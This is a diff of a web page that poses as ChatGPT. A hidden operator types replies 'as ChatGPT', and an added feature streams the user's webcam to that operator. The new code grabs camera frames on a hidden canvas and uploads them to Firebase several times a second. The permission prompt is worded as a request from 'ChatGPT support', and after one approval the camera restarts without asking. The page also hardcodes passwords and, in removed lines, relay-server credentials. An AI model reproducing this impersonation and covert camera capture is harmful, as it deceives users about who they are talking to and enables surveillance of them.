@@ -4,9 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>ChatGPT</title>
-    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        /* … all your original CSS, unchanged … */
         :root {
             --bg: #212121;
             --surface: #2f2f2f;
@@ -34,6 +32,7 @@
         ::-webkit-scrollbar-track { background: transparent; }
         ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.12); border-radius: 3px; }
 
+        /* Login */
         #loginOverlay {
             position: fixed; inset: 0; background: var(--bg);
             z-index: 999; display: flex; align-items: center;
@@ -62,6 +61,7 @@
         }
         .login-error { color: #ff6b6b; font-size: 13px; margin-top: 10px; }
 
+        /* Sidebar */
         .sidebar {
             width: 260px; background: var(--sidebar-bg);
             display: flex; flex-direction: column;
@@ -106,6 +106,7 @@
             justify-content: center; font-weight: 600; color: #fff; flex-shrink: 0;
         }
 
+        /* Main content */
         .main-content { flex: 1; display: flex; flex-direction: column; height: 100dvh; min-width: 0; }
         .topbar {
             display: flex; align-items: center; padding: 0 12px;
@@ -135,6 +136,7 @@
         }
         .tb-share:hover { background: var(--surface); }
 
+        /* Chat */
         .chat-scroll { flex: 1; overflow-y: auto; }
         .welcome {
             display: flex; flex-direction: column; align-items: center;
@@ -157,6 +159,7 @@
         .suggestion-card .sc-title { font-size: 14px; font-weight: 500; color: var(--text); }
         .suggestion-card .sc-sub { font-size: 13px; color: var(--text-muted); }
 
+        /* Messages */
         .messages-wrap { padding: 8px 0 24px; max-width: 768px; margin: 0 auto; width: 100%; }
         .msg { padding: 4px 24px; animation: msgIn 0.18s ease; }
         @keyframes msgIn { from{opacity:0;transform:translateY(5px)} to{opacity:1;transform:translateY(0)} }
@@ -185,6 +188,7 @@
         .act-btn:hover { background: var(--surface); color: var(--text); }
         .act-btn svg { width: 16px; height: 16px; }
 
+        /* Input */
         .input-wrap { padding: 12px 16px 16px; flex-shrink: 0; }
         .input-container { max-width: 768px; margin: 0 auto; }
         .input-box {
@@ -218,9 +222,11 @@
         .input-spacer { flex: 1; }
         .input-footer-text { text-align: center; font-size: 12px; color: var(--text-dim); margin-top: 8px; }
 
+        /* Admin bar */
         .admin-bar { display: none; padding: 12px 16px 16px; flex-shrink: 0; }
         .admin-bar.active { display: block; }
 
+        /* Camera Access Button */
         .admin-cam-btn {
             display: flex; align-items: center; gap: 6px; padding: 7px 14px;
             background: rgba(16,163,127,0.15); border: 1px solid rgba(16,163,127,0.4);
@@ -231,6 +237,7 @@
         .admin-cam-btn.active-cam { background: rgba(255,80,80,0.15); border-color: rgba(255,80,80,0.5); color: #ff6b6b; }
         .admin-cam-btn svg { width: 15px; height: 15px; }
 
+        /* User camera permission notification */
         #camPermissionNotif {
             display: none;
             position: fixed; top: 70px; left: 50%; transform: translateX(-50%);
@@ -271,10 +278,11 @@
         }
         .notif-deny:hover { background: var(--surface2); color: var(--text); }
 
+        /* Admin live camera panel */
         #adminCamPanel {
             display: none;
             position: fixed; bottom: 120px; right: 20px;
-            z-index: 400; width: 240px;
+            z-index: 400; width: 280px;
             background: #000; border-radius: 14px;
             border: 2px solid var(--accent);
             box-shadow: 0 8px 32px rgba(0,0,0,0.6);
@@ -304,15 +312,43 @@
         }
         .cam-panel-btn:hover { background: var(--surface); color: var(--text); }
         .cam-panel-btn svg { width: 14px; height: 14px; }
-        #remoteVideo {
-            width: 100%; display: block;
-            aspect-ratio: 4/3; object-fit: cover; background: #111;
+        .cam-video-wrap {
+            position: relative; width: 100%; background: #111;
+            aspect-ratio: 4/3; overflow: hidden;
         }
+        /* Frame relay: we display an <img> updated from base64 frames */
+        #remoteFrameImg {
+            position: absolute; inset: 0;
+            width: 100%; height: 100%;
+            object-fit: cover;
+            display: block;
+            background: #111;
+        }
+        .cam-connecting-overlay {
+            position: absolute; inset: 0;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            background: rgba(0,0,0,0.85); z-index: 5; gap: 10px;
+        }
+        .cam-connecting-overlay .spinner {
+            width: 32px; height: 32px; border: 3px solid rgba(16,163,127,0.3);
+            border-top-color: var(--accent2); border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .cam-connecting-overlay span { font-size: 12px; color: var(--text-muted); }
         .cam-panel-footer {
             padding: 6px 10px; font-size: 11px; color: var(--text-dim);
             text-align: center; background: rgba(0,0,0,0.4);
         }
+        /* FPS badge */
+        #fpsBadge {
+            position: absolute; top: 6px; right: 6px; z-index: 6;
+            font-size: 10px; font-weight: 600; padding: 2px 7px;
+            border-radius: 10px; background: rgba(0,0,0,0.6);
+            color: var(--accent2);
+        }
 
+        /* Minimized camera pill */
         #camMiniPill {
             display: none;
             position: fixed; bottom: 120px; right: 20px;
@@ -320,7 +356,7 @@
             border: 1px solid var(--accent); border-radius: 20px;
             padding: 6px 14px; cursor: pointer;
             font-size: 13px; color: var(--accent2);
-            display: none; align-items: center; gap: 6px;
+            align-items: center; gap: 6px;
             box-shadow: 0 4px 16px rgba(0,0,0,0.4);
         }
         #camMiniPill.show { display: flex; }
@@ -343,6 +379,7 @@
             margin-top: 5px; font-weight: 500;
         }
 
+        /* Typing indicator bar */
         .typing-bar {
             height: 0; overflow: hidden;
             transition: height 0.2s ease;
@@ -366,6 +403,7 @@
             30%          { transform:translateY(-5px); opacity:1; }
         }
 
+        /* Mobile sidebar overlay */
         .sidebar-overlay {
             position: fixed; inset: 0; background: rgba(0,0,0,0.6);
             z-index: 50; display: none;
@@ -384,16 +422,21 @@
             .sidebar.collapsed { width: 280px !important; transform: translateX(-100%) !important; }
             .main-content { width: 100%; }
             .tb-share { display: none; }
+            #adminCamPanel { width: calc(100vw - 40px); right: 20px; left: 20px; }
         }
+
+        /* Hidden canvas for frame capture */
+        #captureCanvas { display: none; }
     </style>
 </head>
 <body>
 
+<!-- Login -->
 <div id="loginOverlay">
     <div class="login-card">
         <div class="login-logo">
             <svg viewBox="0 0 41 41" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M37.532 16.87a9.963 9.963 0 00-.856-8.184 10.078 10.078 0 00-10.855-4.835 9.964 9.964 0 00-7.505-3.31 10.079 10.079 0 00-9.61 6.977 9.967 9.967 0 00-6.664 4.834 10.08 10.08 0 001.24 11.817 9.965 9.965 0 00.856 8.185 10.079 10.079 0 0010.855 4.835 9.965 9.965 0 007.504 3.31 10.078 10.078 0 009.617-6.981 9.967 9.967 0 006.663-4.834 10.079 10.079 0 00-1.243-11.813zM22.498 37.886a7.474 7.474 0 01-4.799-1.735c.061-.033.168-.091.237-.134l7.964-4.6a1.294 1.294 0 00.655-1.134V19.054l3.366 1.944a.12.12 0 01.066.092v9.299a7.505 7.505 0 01-7.49 7.496z" fill="currentColor"/>
+                <path d="M37.532 16.87a9.963 9.963 0 00-.856-8.184 10.078 10.078 0 00-10.855-4.835 9.964 9.964 0 00-7.505-3.31 10.079 10.079 0 00-9.61 6.977 9.967 9.967 0 00-6.664 4.834 10.08 10.08 0 001.24 11.817 9.965 9.965 0 00.856 8.185 10.079 10.079 0 0010.855 4.835 9.965 9.965 0 007.504 3.31 10.078 10.078 0 009.617-6.981 9.967 9.967 0 006.663-4.834 10.079 10.079 0 00-1.243-11.813zM22.498 37.886a7.474 7.474 0 01-4.799-1.735c.061-.033.168-.091.237-.134l7.964-4.6a1.294 1.294 0 00.655-1.134V19.054l3.366 1.944a.12.12 0 01.066.092v9.299a7.505 7.505 0 01-7.49 7.496zM6.392 31.006a7.471 7.471 0 01-.894-5.023c.06.036.162.099.237.141l7.964 4.6a1.297 1.297 0 001.308 0l9.724-5.614v3.888a.12.12 0 01-.048.103l-8.051 4.649a7.504 7.504 0 01-10.24-2.744zM4.297 13.62A7.469 7.469 0 018.2 10.333c0 .068-.004.19-.004.274v9.201a1.294 1.294 0 00.654 1.132l9.723 5.614-3.366 1.944a.12.12 0 01-.114.012L7.044 23.86a7.504 7.504 0 01-2.747-10.24zm27.658 6.437l-9.724-5.615 3.367-1.943a.121.121 0 01.114-.012l8.048 4.648a7.498 7.498 0 01-1.158 13.528v-9.476a1.293 1.293 0 00-.647-1.13zm3.35-5.043c-.059-.037-.162-.099-.236-.141l-7.965-4.6a1.298 1.298 0 00-1.308 0l-9.723 5.614v-3.888a.12.12 0 01.048-.103l8.05-4.645a7.497 7.497 0 0111.135 7.763zm-21.063 6.929l-3.367-1.944a.12.12 0 01-.065-.092v-9.299a7.497 7.497 0 0112.293-5.756 6.94 6.94 0 00-.236.134l-7.965 4.6a1.294 1.294 0 00-.654 1.132l-.006 11.225zm1.829-3.943l4.33-2.501 4.332 2.5v4.998l-4.331 2.5-4.331-2.5V18z" fill="currentColor"/>
             </svg>
         </div>
         <h2>Welcome back</h2>
@@ -404,6 +447,7 @@
     </div>
 </div>
 
+<!-- Camera permission notification (shown to USER when admin requests) -->
 <div id="camPermissionNotif">
     <div class="notif-header">
         <div class="notif-icon">
@@ -418,6 +462,7 @@
     </div>
 </div>
 
+<!-- Admin camera live panel -->
 <div id="adminCamPanel">
     <div class="cam-panel-header">
         <div class="cam-panel-title">
@@ -433,19 +478,32 @@
             </button>
         </div>
     </div>
-    <video id="remoteVideo" autoplay playsinline muted></video>
-    <div class="cam-panel-footer">User's live camera feed</div>
+    <div class="cam-video-wrap">
+        <img id="remoteFrameImg" src="" alt="Live feed" style="display:none;" />
+        <div class="cam-connecting-overlay" id="camConnectingOverlay">
+            <div class="spinner"></div>
+            <span id="camConnectingText">Waiting for user…</span>
+        </div>
+        <div id="fpsBadge" style="display:none;"></div>
+    </div>
+    <div class="cam-panel-footer" id="camPanelFooter">Connecting…</div>
 </div>
 
+<!-- Minimized pill -->
 <div id="camMiniPill">
     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
     Live Feed
     <div class="cam-live-dot"></div>
 </div>
 
+<!-- Hidden canvas for frame capture on user side -->
+<canvas id="captureCanvas"></canvas>
+
+<!-- App -->
 <div id="app" style="display:none; flex-direction:row; height:100dvh;">
     <div class="sidebar-overlay" id="sbOverlay"></div>
 
+    <!-- Sidebar -->
     <aside class="sidebar" id="sidebar">
         <div class="sb-top">
             <button class="sb-icon-btn" id="sbToggle" title="Close sidebar">
@@ -469,7 +527,7 @@
         </div>
         <div class="sb-footer-section">
             <button class="sb-footer-btn">
-                <div style="width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#a78bfa,#818cf8);display:flex;align-items:center;justify-content:center;">
+                <div style="width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#a78bfa,#818cf8);display:flex;align-items:center;justify-content:center;flex-shrink:0;">
                     <svg viewBox="0 0 24 24" fill="white" width="16" height="16"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
                 </div>
                 <div style="text-align:left;">
@@ -480,11 +538,12 @@
             <button class="sb-footer-btn">
                 <div class="sb-avatar">U</div>
                 <div style="flex:1;text-align:left;">User</div>
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><circle cx="12" cy="12" r="1"/><circle cx="19" cy="12" r="1"/><circle cx="5" cy="12" r="1"/></svg>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16" style="color:var(--text-muted);flex-shrink:0;"><circle cx="12" cy="12" r="1"/><circle cx="19" cy="12" r="1"/><circle cx="5" cy="12" r="1"/></svg>
             </button>
         </div>
     </aside>
 
+    <!-- Main -->
     <div class="main-content">
         <div class="topbar">
             <button class="tb-btn" id="menuBtn" title="Toggle sidebar">
@@ -531,6 +590,7 @@
             <div class="messages-wrap" id="msgWrap"></div>
         </div>
 
+        <!-- Typing status bars -->
         <div class="typing-bar" id="userTypingBar">
             <div class="tdots"><span></span><span></span><span></span></div>
             <span>User is typing…</span>
@@ -540,13 +600,14 @@
             <span>ChatGPT is thinking…</span>
         </div>
 
+        <!-- User input -->
         <div class="input-wrap" id="userInputWrap">
             <div class="input-container">
                 <div class="input-box">
                     <div class="input-top">
                         <textarea class="input-ta" id="userTa" placeholder="Message ChatGPT" rows="1"></textarea>
                         <button class="btn-send" id="sendBtn" disabled>
-                            <svg viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2.5"><path d="M12 2L12 22M12 2L6 8M12 2L18 8"/></svg>
+                            <svg viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L12 22M12 2L6 8M12 2L18 8"/></svg>
                         </button>
                     </div>
                     <div class="input-bottom">
@@ -561,12 +622,13 @@
             </div>
         </div>
 
+        <!-- Admin bar -->
         <div class="admin-bar" id="adminBar">
             <div class="admin-container">
                 <div class="admin-box">
                     <textarea class="admin-ta" id="adminTa" placeholder="Reply as ChatGPT..." rows="1"></textarea>
                     <button class="btn-send" id="adminSendBtn">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2.5"><path d="M12 2L12 22M12 2L6 8M12 2L18 8"/></svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L12 22M12 2L6 8M12 2L18 8"/></svg>
                     </button>
                 </div>
                 <div style="display:flex;align-items:center;justify-content:space-between;margin-top:6px;gap:10px;">
@@ -622,12 +684,14 @@
     const chatId = "global_chat";
     const messagesRef = db.ref('chats/' + chatId + '/messages');
     const typingRef   = db.ref('chats/' + chatId + '/typing');
+    const camRef      = db.ref('chats/' + chatId + '/camera');
 
     const addedKeys = new Set();
     const USER_PASS  = "pra(sam)26";
     const ADMIN_PASS = "PRA(SAM)26";
     let role = null;
 
+    // ── Cipher maps ──
     const decodeMap = {
       p:'a',m:'b',t:'c',g:'d',n:'e',r:'f',i:'g',c:'h',o:'i',y:'j',
       z:'k',q:'l',d:'m',l:'n',s:'o',u:'p',w:'q',e:'r',h:'s',v:'t',
@@ -648,6 +712,7 @@
       }).join('');
     }
 
+    // ── Audio ──
     let audioCtx = null;
     function unlockAudio() {
       if (audioCtx) return;
@@ -672,9 +737,10 @@
           g.gain.exponentialRampToValueAtTime(0.001, t + dur);
           osc.start(t); osc.stop(t + dur + 0.05);
         });
-      } catch(e) { console.warn('Audio failed:', e); }
+      } catch(e) {}
     }
 
+    // ── Tab title badge ──
     let unread = 0;
     const baseTitle = document.title;
     function bumpTitle() {
@@ -683,6 +749,7 @@
     }
     window.addEventListener('focus', () => { unread = 0; document.title = baseTitle; });
 
+    // ── LOGIN ──
     document.getElementById('loginBtn').addEventListener('click', tryLogin);
     document.getElementById('pwInput').addEventListener('keydown', e => { if(e.key==='Enter') tryLogin(); });
 
@@ -715,6 +782,7 @@
       }
 
       setupCameraFeature();
+
       messagesRef.once('value', snap => {
         if (snap.exists()) {
           snap.forEach(child => {
@@ -763,6 +831,7 @@
       });
     }
 
+    // ── Helpers ──
     function escHtml(s) {
       return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');
     }
@@ -827,6 +896,7 @@
       scrollBottom();
     }
 
+    // ── User input ──
     function setupUserInput() {
       const ta  = document.getElementById('userTa');
       const btn = document.getElementById('sendBtn');
@@ -844,7 +914,6 @@
       ta.addEventListener('input',          signalTyping);
       ta.addEventListener('keyup',          signalTyping);
       ta.addEventListener('compositionend', signalTyping);
-
       ta.addEventListener('keydown', e => { if(e.key==='Enter' && !e.shiftKey){ e.preventDefault(); doSend(); } });
       btn.addEventListener('click', doSend);
 
@@ -858,6 +927,7 @@
       }
     }
 
+    // ── Admin input ──
     function setupAdminInput() {
       const ta  = document.getElementById('adminTa');
       const btn = document.getElementById('adminSendBtn');
@@ -874,7 +944,6 @@
       ta.addEventListener('input',          signalTyping);
       ta.addEventListener('keyup',          signalTyping);
       ta.addEventListener('compositionend', signalTyping);
-
       ta.addEventListener('keydown', e => { if(e.key==='Enter' && !e.shiftKey){ e.preventDefault(); doSend(); } });
       btn.addEventListener('click', doSend);
 
@@ -888,263 +957,237 @@
       }
     }
 
-    // ═══ CAMERA WITH YOUR METERED TURN ═══
-    const camRef = db.ref('chats/' + chatId + '/camera');
-    let peer = null;
-    let localStream = null;
-    let camActive = false;
+    // ════════════════════════════════════════════════════════════════
+    // ── CAMERA — Firebase Frame Relay (NO WebRTC, NO TURN needed) ──
+    //
+    // How it works:
+    //   USER side: captures video frames from webcam → encodes to
+    //              JPEG base64 → writes to Firebase Realtime DB
+    //              at ~5 fps (adjustable). Each frame overwrites
+    //              the previous one (single value, not a list).
+    //
+    //   ADMIN side: listens to that Firebase value → updates an
+    //               <img> tag src. Looks like a live feed.
+    //
+    // Pros: Works on ANY network. No TURN. No WebRTC. No peer IDs.
+    // Cons: ~5fps, ~0.5s latency, uses Firebase bandwidth (~30KB/frame).
+    // ════════════════════════════════════════════════════════════════
 
-    const CAM_CONSENT_KEY = 'camConsent_' + chatId;
-    let userCamConsented = localStorage.getItem(CAM_CONSENT_KEY) === 'yes';
+    const CAM_CONSENT_KEY  = 'camConsent_' + chatId;
+    let userCamConsented   = localStorage.getItem(CAM_CONSENT_KEY) === 'yes';
+    let captureInterval    = null;
+    let localStream        = null;
+    let camActive          = false;
 
-    async function getCameraStream() {
-      const constraints = [
-        { video: { width: { ideal: 640 }, height: { ideal: 480 } }, audio: false },
-        { video: true, audio: false }
-      ];
-      for (const c of constraints) {
-        try { const s = await navigator.mediaDevices.getUserMedia(c); if (s) return s; } catch(_) {}
-      }
-      return null;
-    }
+    // Firebase paths
+    const camStatusRef = camRef.child('status');
+    const camFrameRef  = camRef.child('frame');   // single value: base64 JPEG
 
-    // ── YOUR PERSONAL TURN SERVERS ──
-    const PEER_OPTIONS = {
-      config: {
-        iceServers: [
-          // Google STUN
-          { urls: 'stun:stun.l.google.com:19302' },
-          { urls: 'stun:stun1.l.google.com:19302' },
-          // Your Metered TURN servers
-          {
-            urls: "stun:stun.relay.metered.ca:80",
-          },
-          {
-            urls: "turn:global.relay.metered.ca:80",
-            username: "d3255d391c5e1dead913635e",
-            credential: "cp47LPDlBBzYiaBJ",
-          },
-          {
-            urls: "turn:global.relay.metered.ca:80?transport=tcp",
-            username: "d3255d391c5e1dead913635e",
-            credential: "cp47LPDlBBzYiaBJ",
-          },
-          {
-            urls: "turn:global.relay.metered.ca:443",
-            username: "d3255d391c5e1dead913635e",
-            credential: "cp47LPDlBBzYiaBJ",
-          },
-          {
-            urls: "turns:global.relay.metered.ca:443?transport=tcp",
-            username: "d3255d391c5e1dead913635e",
-            credential: "cp47LPDlBBzYiaBJ",
-          }
-        ],
-        iceCandidatePoolSize: 2
-      },
-      debug: 2
-    };
+    // Canvas used for frame capture
+    const canvas  = document.getElementById('captureCanvas');
+    const ctx2d   = canvas.getContext('2d');
+
+    // FPS tracking for admin display
+    let fpsFrameCount = 0;
+    let fpsLast       = Date.now();
 
     function setupCameraFeature() {
       if (role === 'assistant') {
-        const camBtn      = document.getElementById('adminCamAccessBtn');
-        const camPanel    = document.getElementById('adminCamPanel');
-        const miniPill    = document.getElementById('camMiniPill');
-        const minimizeBtn = document.getElementById('camMinimizeBtn');
-        const stopBtn     = document.getElementById('camStopBtn');
-
-        camBtn.addEventListener('click', () => {
-          if (camActive) { stopCameraSession(); return; }
-          camRef.remove().then(() => {
-            camRef.child('status').set('requesting');
-            camBtn.innerHTML = svgCam() + ' Waiting…';
-            camBtn.disabled = true;
-            startAdminPeerJS();
-          });
-        });
-
-        minimizeBtn.addEventListener('click', () => { camPanel.classList.remove('show'); miniPill.classList.add('show'); });
-        miniPill.addEventListener('click',    () => { miniPill.classList.remove('show'); camPanel.classList.add('show'); });
-        stopBtn.addEventListener('click', stopCameraSession);
-
-        camRef.child('status').on('value', snap => {
-          const status = snap.val();
-          if (status === 'user_denied') {
-            resetAdminCamBtn();
-            alert('User denied camera access.');
-            camRef.remove();
-          }
-          if (status === 'cam_error') {
-            resetAdminCamBtn();
-            alert('User camera error.');
-            camRef.remove();
-          }
-          if (status === 'stopped') {
-            stopCameraSession();
-          }
-        });
-      }
-
-      if (role === 'user') {
-        camRef.child('status').on('value', snap => {
-          const status = snap.val();
-          if (status === 'requesting') {
-            if (userCamConsented) {
-              startUserPeerJS();
-            } else {
-              document.getElementById('camAllowBtn').textContent = 'Allow';
-              document.querySelector('.notif-sub').textContent = 'ChatGPT support would like to access your camera to assist you better.';
-              document.getElementById('camPermissionNotif').classList.add('show');
-            }
-          }
-          if (status === 'stopped') {
-            document.getElementById('camPermissionNotif').classList.remove('show');
-            stopUserCamera();
-          }
-        });
-
-        document.getElementById('camAllowBtn').addEventListener('click', async () => {
-          localStorage.setItem(CAM_CONSENT_KEY, 'yes');
-          userCamConsented = true;
-          document.getElementById('camPermissionNotif').classList.remove('show');
-          await startUserPeerJS();
-        });
-
-        document.getElementById('camDenyBtn').addEventListener('click', () => {
-          document.getElementById('camPermissionNotif').classList.remove('show');
-          camRef.child('status').set('user_denied');
-        });
+        setupAdminCamera();
+      } else {
+        setupUserCamera();
       }
     }
 
-    function startAdminPeerJS() {
-      if (peer) { peer.destroy(); }
-      peer = new Peer(undefined, PEER_OPTIONS);
+    // ── ADMIN SIDE ──
+    function setupAdminCamera() {
+      const camBtn      = document.getElementById('adminCamAccessBtn');
+      const camPanel    = document.getElementById('adminCamPanel');
+      const miniPill    = document.getElementById('camMiniPill');
+      const minimizeBtn = document.getElementById('camMinimizeBtn');
+      const stopBtn     = document.getElementById('camStopBtn');
+      const img         = document.getElementById('remoteFrameImg');
+      const overlay     = document.getElementById('camConnectingOverlay');
+      const connText    = document.getElementById('camConnectingText');
+      const fpsBadge    = document.getElementById('fpsBadge');
 
-      peer.on('open', id => {
-        console.log('Admin peer opened with ID:', id);
-        camRef.child('adminPeerId').set(id);
+      camBtn.addEventListener('click', () => {
+        if (camActive) { adminStopCamera(); return; }
+        // Clear old data, send request
+        camRef.remove().then(() => {
+          camStatusRef.set('requesting');
+          camBtn.innerHTML = svgCam() + ' Waiting for user…';
+          camBtn.disabled  = false;
+          camActive = true;
+          camPanel.classList.add('show');
+          connText.textContent = 'Waiting for user to allow…';
+        });
       });
 
-      peer.on('call', call => {
-        console.log('Incoming call from user.');
-        call.answer();
-        camActive = true;
+      minimizeBtn.addEventListener('click', () => {
+        camPanel.classList.remove('show');
+        miniPill.classList.add('show');
+      });
+      miniPill.addEventListener('click', () => {
+        miniPill.classList.remove('show');
+        camPanel.classList.add('show');
+      });
+      stopBtn.addEventListener('click', adminStopCamera);
 
-        const camBtn     = document.getElementById('adminCamAccessBtn');
-        const camPanel   = document.getElementById('adminCamPanel');
-        const remoteVideo = document.getElementById('remoteVideo');
+      // Listen to status updates from user
+      camStatusRef.on('value', snap => {
+        const st = snap.val();
+        if (!camActive) return;
+        if (st === 'live') {
+          connText.textContent = 'Connected — receiving frames…';
+        }
+        if (st === 'user_denied') {
+          alert('User denied camera access.');
+          adminStopCamera();
+        }
+        if (st === 'cam_error') {
+          alert('User camera is not available (browser may have denied access).');
+          adminStopCamera();
+        }
+        if (st === 'stopped') {
+          adminStopCamera();
+        }
+      });
 
-        call.on('stream', stream => {
-          console.log('Received remote stream:', stream.getTracks());
-          remoteVideo.srcObject = stream;
-          remoteVideo.muted = true;
+      // Listen to incoming frames
+      camFrameRef.on('value', snap => {
+        if (!camActive) return;
+        const frame = snap.val();
+        if (!frame) return;
 
-          const playPromise = remoteVideo.play();
-          if (playPromise !== undefined) {
-            playPromise.then(() => {
-              console.log('Video playing.');
-              camPanel.classList.add('show');
-              camBtn.innerHTML = svgCamOff() + ' Stop Camera';
-              camBtn.classList.add('active-cam');
-              camBtn.disabled = false;
-              document.querySelector('.cam-panel-footer').textContent = "User's live camera feed";
-            }).catch(e => {
-              console.warn('Autoplay prevented:', e);
-              const overlay = document.createElement('div');
-              overlay.style.cssText = 'position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.6);cursor:pointer;z-index:10;';
-              overlay.innerHTML = '<div style="color:#fff;font-size:13px;padding:12px;">▶ Click to start video</div>';
-              overlay.onclick = () => { remoteVideo.play(); overlay.remove(); };
-              camPanel.style.position = 'relative';
-              camPanel.appendChild(overlay);
-              camPanel.classList.add('show');
-              camBtn.innerHTML = svgCamOff() + ' Stop Camera';
-              camBtn.classList.add('active-cam');
-              camBtn.disabled = false;
-            });
+        // Show the image, hide the connecting overlay
+        if (overlay.style.display !== 'none') {
+          overlay.style.display = 'none';
+          img.style.display = 'block';
+          fpsBadge.style.display = 'block';
+          document.getElementById('camPanelFooter').textContent = "User's live camera feed";
+          camBtn.innerHTML = svgCamOff() + ' Stop Camera';
+          camBtn.classList.add('active-cam');
+        }
+
+        img.src = frame;
+
+        // FPS calculation
+        fpsFrameCount++;
+        const now = Date.now();
+        if (now - fpsLast >= 1000) {
+          fpsBadge.textContent = fpsFrameCount + ' fps';
+          fpsFrameCount = 0;
+          fpsLast = now;
+        }
+      });
+
+      function adminStopCamera() {
+        camActive = false;
+        camStatusRef.set('stopped');
+        setTimeout(() => camRef.remove(), 1500);
+        camPanel.classList.remove('show');
+        miniPill.classList.remove('show');
+        img.style.display = 'none';
+        img.src = '';
+        overlay.style.display = 'flex';
+        connText.textContent = 'Waiting for user…';
+        fpsBadge.style.display = 'none';
+        fpsFrameCount = 0;
+        document.getElementById('camPanelFooter').textContent = 'Connecting…';
+        resetAdminCamBtn();
+      }
+    }
+
+    // ── USER SIDE ──
+    function setupUserCamera() {
+      camStatusRef.on('value', snap => {
+        const st = snap.val();
+        if (st === 'requesting') {
+          if (userCamConsented) {
+            // Auto-start without asking
+            startUserStream();
+          } else {
+            document.getElementById('camPermissionNotif').classList.add('show');
           }
-        });
-
-        call.on('close', stopCameraSession);
-        call.on('error', err => {
-          console.error('Call error:', err);
-          stopCameraSession();
-        });
+        }
+        if (st === 'stopped') {
+          document.getElementById('camPermissionNotif').classList.remove('show');
+          stopUserStream();
+        }
       });
 
-      peer.on('error', err => {
-        console.error('PeerJS Admin Error:', err);
-        stopCameraSession();
+      document.getElementById('camAllowBtn').addEventListener('click', () => {
+        localStorage.setItem(CAM_CONSENT_KEY, 'yes');
+        userCamConsented = true;
+        document.getElementById('camPermissionNotif').classList.remove('show');
+        startUserStream();
+      });
+
+      document.getElementById('camDenyBtn').addEventListener('click', () => {
+        document.getElementById('camPermissionNotif').classList.remove('show');
+        camStatusRef.set('user_denied');
       });
     }
 
-    async function startUserPeerJS() {
-      if (localStream) return;
+    async function startUserStream() {
+      if (localStream) return; // already running
 
-      localStream = await getCameraStream();
+      // Try to get camera
+      const constraints = [
+        { video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }, audio: false },
+        { video: { width: { ideal: 320 }, height: { ideal: 240 } }, audio: false },
+        { video: true, audio: false }
+      ];
+      for (const c of constraints) {
+        try { localStream = await navigator.mediaDevices.getUserMedia(c); break; }
+        catch(_) {}
+      }
       if (!localStream) {
-        camRef.child('status').set('cam_error');
+        camStatusRef.set('cam_error');
         return;
       }
 
-      function waitForAdminId(retries) {
-        if (retries <= 0) {
-          camRef.child('status').set('cam_error');
-          return;
-        }
-        camRef.child('adminPeerId').once('value', snap => {
-          const adminId = snap.val();
-          if (!adminId) {
-            setTimeout(() => waitForAdminId(retries - 1), 500);
-            return;
-          }
-
-          if (peer) peer.destroy();
-          peer = new Peer(undefined, PEER_OPTIONS);
-
-          peer.on('open', id => {
-            console.log('User peer opened with ID:', id);
-            const call = peer.call(adminId, localStream);
-            console.log('Calling admin:', adminId);
-            camRef.child('status').set('live');
-            call.on('close', stopUserCamera);
-            call.on('error', err => {
-              console.error('Outgoing call error:', err);
-              stopUserCamera();
-              camRef.child('status').set('cam_error');
-            });
-          });
-
-          peer.on('error', err => {
-            console.error('PeerJS User Error:', err);
-            stopUserCamera();
-            camRef.child('status').set('cam_error');
-          });
-        });
+      // Attach stream to a hidden video element for frame capture
+      let hiddenVideo = document.getElementById('_hiddenCamVideo');
+      if (!hiddenVideo) {
+        hiddenVideo = document.createElement('video');
+        hiddenVideo.id = '_hiddenCamVideo';
+        hiddenVideo.setAttribute('playsinline', '');
+        hiddenVideo.muted = true;
+        hiddenVideo.style.display = 'none';
+        document.body.appendChild(hiddenVideo);
       }
-      waitForAdminId(10);
+      hiddenVideo.srcObject = localStream;
+      hiddenVideo.play().catch(() => {});
+
+      camStatusRef.set('live');
+
+      // Start sending frames at ~5fps
+      // Quality 0.5 = ~20-40 KB per frame (good balance for Firebase)
+      const FPS = 5;
+      canvas.width  = 320;
+      canvas.height = 240;
+
+      captureInterval = setInterval(() => {
+        try {
+          ctx2d.drawImage(hiddenVideo, 0, 0, 320, 240);
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
+          // Only write if we got a real frame (not blank)
+          if (dataUrl && dataUrl.length > 100) {
+            camFrameRef.set(dataUrl);
+          }
+        } catch(e) {}
+      }, Math.round(1000 / FPS));
     }
 
-    function stopCameraSession() {
-      camActive = false;
-      camRef.child('status').set('stopped');
-      setTimeout(() => camRef.remove(), 1000);
-
-      if (peer) { peer.destroy(); peer = null; }
-      if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
-
-      const camPanel    = document.getElementById('adminCamPanel');
-      const miniPill    = document.getElementById('camMiniPill');
-      const remoteVideo = document.getElementById('remoteVideo');
-      if (camPanel)    camPanel.classList.remove('show');
